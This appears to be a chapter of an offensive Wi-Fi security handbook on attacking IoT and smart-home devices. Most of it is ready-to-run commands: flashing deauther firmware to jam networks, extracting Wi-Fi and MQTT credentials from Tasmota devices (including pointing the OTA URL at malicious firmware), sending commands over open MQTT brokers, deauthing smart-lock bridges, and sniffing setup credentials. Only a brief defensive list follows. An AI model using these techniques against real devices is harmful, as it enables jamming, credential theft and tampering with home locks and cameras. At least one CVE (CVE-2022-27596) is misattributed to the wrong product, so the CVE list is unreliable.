# 09 - IoT and Smart Home Wi-Fi Attacks

## Overview

IoT devices (smart cameras, locks, bulbs, thermostats, speakers) often have weak Wi-Fi security: hardcoded credentials, outdated protocols, no PMF, WPS enabled, or vulnerable firmware. They are prime targets for Wi-Fi-based attacks.

## IoT Wi-Fi Fingerprinting

```bash
# Identify IoT devices by OUI (first 3 octets of MAC)
# Common IoT OUIs:
# 18:B4:30 - Nest/Google
# 00:17:88 - Philips Hue
# B0:BE:76 - Amazon Echo
# 64:69:4E - Ring
# A4:CF:12 - Espressif (ESP8266/ESP32)
# 24:6F:28 - Espressif
# 3C:71:BF - Espressif

# Automated IoT identification
airodump-ng wlan0mon --manufacturer --output-format csv -w iot_scan
grep -i -E "nest|philips|amazon|ring|espressif|xiaomi|tplink|sonoff" iot_scan-01.csv
```

## ESP8266/ESP32 Deauther

The ESP8266 can be flashed with deauther firmware to create a portable Wi-Fi jammer.

```bash
# Build ESP8266 Deauther
# Hardware: Wemos D1 Mini, NodeMCU, or any ESP8266 board

# Flash firmware
esptool.py --port /dev/ttyUSB0 write_flash -fm dio 0x00000 deauther_2.6.0.bin

# Web interface: connect to ESP AP "pwned", password "deauther"
# Navigate to 192.168.4.1
# Select target → Attack → Deauth
# Also supports beacon flood, probe flood, random AP spam
```

## Tasmota Firmware Backdoors

Many IoT devices run Tasmota (open-source ESP8266 firmware). If you gain local network access:

```bash
# Default Tasmota web interface credentials are often admin/admin or empty
# Once authenticated, extract Wi-Fi credentials from backup:
curl http://192.168.1.100/backup
# Contains: SSID, Password, MQTT broker credentials, API keys

# Tasmota Console commands via HTTP
curl "http://192.168.1.100/cm?cmnd=Status"  # Full device status
curl "http://192.168.1.100/cm?cmnd=WifiConfig"  # Wi-Fi config
curl "http://192.168.1.100/cm?cmnd=MqttHost"  # MQTT broker
curl "http://192.168.1.100/cm?cmnd=OtaUrl"  # OTA URL (inject malicious firmware)
```

## Smart Camera Exploitation

```bash
# Many cheap Wi-Fi cameras use P2P cloud services with predictable UIDs
# UID format: <region>-<serial> (e.g., AAAA-123456-ABCDE)
# Serial numbers are sequential or derived from MAC

# Extract camera UID via Wi-Fi recon
airodump-ng wlan0mon | grep -i camera

# P2P protocols (TUTK, XMeye) have known vulnerabilities:
# - CVE-2022-27596: XMeye P2P authentication bypass
# - CVE-2021-33044: Dahua authentication bypass
```

## Smart Lock Wi-Fi Attacks

```bash
# August Lock, Yale Assure, Schlage Encode communicate via Wi-Fi bridges
# Bridge devices often have weaker security than the locks themselves

# 1. Recon: Find bridge MAC
airodump-ng wlan0mon | grep -i -E "august|yale|schlage"

# 2. Deauth bridge → lock loses cloud connectivity → falls back to Bluetooth
# 3. Bluetooth attacks on lock (separate from Wi-Fi, but enabled by Wi-Fi deauth)
```

## MQTT Over Wi-Fi

IoT devices often use MQTT for command/control. MQTT brokers frequently run on the same Wi-Fi segment.

```bash
# Scan for MQTT brokers (port 1883, 8883 TLS)
nmap -p 1883,8883,8083,9001 192.168.1.0/24

# Connect without auth (common on IoT segments)
mosquitto_sub -h 192.168.1.50 -t "#" -v

# Publish commands
mosquitto_pub -h 192.168.1.50 -t "home/livingroom/light" -m "ON"

# Common IoT MQTT topics:
# homeassistant/ - Home Assistant
# tasmota/discovery/ - Tasmota devices
# tele/ - Telemetry data
# cmnd/ - Commands
```

## ZigBee-to-Wi-Fi Bridge Attacks

```bash
# Philips Hue Bridge, Samsung SmartThings Hub, Aeotec Hub
# These bridge ZigBee/Z-Wave to Wi-Fi/Ethernet

# Hue Bridge vulnerability: firmware extraction
# CVE-2020-6007: Hue bridge command injection via ZigBee
# Once bridge is compromised, Wi-Fi credentials extracted from flash

# SmartThings Hub: runs Linux, SSH with known credentials in older firmware
```

## Wi-Fi Credential Extraction from IoT

```bash
# Method 1: UART access (open device, solder to TX/RX pins)
# Boot log often contains Wi-Fi credentials
# Example ESP8266 boot:
# sdk=2.2.2(14b3300)
# wifi_ssid=MyNetwork
# wifi_pass=MyPassword123

# Method 2: Firmware dump via SPI flash programmer
# Read 4MB/8MB SPI flash chip → binwalk -e firmware.bin
# strings firmware.bin | grep -i -E "ssid|password|psk|wpa"

# Method 3: OTA firmware interception
# Set up rogue AP with same SSID, force IoT to connect
# Capture OTA download traffic, extract firmware URL and auth
```

## IoT-Specific Rogue AP

```bash
# IoT devices often auto-connect to "open" networks or have weak validation
# Create open network with same SSID as IoT's fallback network

# Many IoT devices have a "setup" mode that creates an open AP
# Example: "Sonoff_XXXX", "ESP_XXXXXX", "TP-LINK_Smart Bulb_XXXX"
# Connect to setup AP, configure device, capture credentials in transit

# Some devices use HTTP (not HTTPS) for setup → credentials in plaintext
tcpdump -i wlan0mon port 80 -w iot_http.pcap
```

## Defensive Application

- **IoT VLAN isolation**: Put all IoT devices on isolated VLAN, no routing to corporate Wi-Fi
- **No WPS on IoT APs**: Disable WPS entirely; IoT devices rarely need it
- **Firmware monitoring**: Track IoT device firmware versions, alert on outdated
- **MQTT auth**: Require username/password + TLS on MQTT brokers
- **Network segmentation**: Prevent IoT devices from accessing management interfaces
- **ZigBee network key rotation**: Rotate ZigBee network keys quarterly
- **Disable IoT setup mode**: After initial configuration, disable AP mode

## References

- OWASP IoT Top 10
- CVE-2022-27596, CVE-2021-33044, CVE-2020-6007
- https://github.com/SpacehuhnTech/esp8266_deauther
- Tasmota documentation: https://tasmota.github.io/docs/
